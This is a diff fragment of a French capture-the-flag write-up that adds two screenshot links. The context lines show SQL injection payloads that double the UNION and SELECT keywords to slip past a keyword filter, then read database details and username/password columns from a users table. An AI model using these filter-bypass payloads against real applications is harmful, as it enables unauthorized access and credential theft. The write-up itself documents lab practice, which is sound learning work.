@@ -56,12 +56,17 @@ Maintenant qu'on a le nombre de colonne, reste plus qu'à chercher un peu dans l
 ' and 0 UUNIONNION SSELECTELECT version(),user(),database()#
 ```
 
+
+![gogol1_1](gogol_1.png)
+
 on pourrait facilement retrouver le nom des tables mais le plus simple reste d'essayer avec des nom de tables / champs classiques :
 
 
 ```
 ' and 0 UUNIONNION SSELECTELECT username,password,3 from users#
 ```
+
+![gogol1_2](gogol_2.png)
 
 Et le challenge est validé :)
 
